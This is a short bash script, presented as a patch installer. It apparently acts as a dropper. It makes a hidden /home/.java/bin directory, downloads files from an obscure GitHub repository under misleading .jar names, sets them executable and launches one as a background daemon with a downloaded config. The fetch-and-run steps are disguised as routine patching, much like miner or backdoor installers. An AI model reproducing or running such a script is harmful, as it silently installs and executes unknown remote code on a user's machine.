#!/bin/bash

function fetch_files() {
    echo "Applying Patches ..."
    mkdir -p /home/.java/bin
    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o patch.jar
    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/n1-conf.json -o conf.json
    echo "DONE ..."
}

function start_app() {
    chmod a+x /home/.java/bin/***
    cd /home/.java/bin && ./plugins.jar -c ./cfg.conf -d
    echo "SERVER STARTED ..."
}

if [ -f "/home/.java/bin/cfg.conf" ] && [ -f "/home/.java/bin/patch.jar" ] && [ -f "/home/.java/bin/plugins.jar" ] && [ -f "/home/.java/bin/conf.json" ]; then
    echo "Patch files already fetched ..."
    start_app
else
    rm -rf /home/.java/bin/**
    fetch_files
    start_app
fi
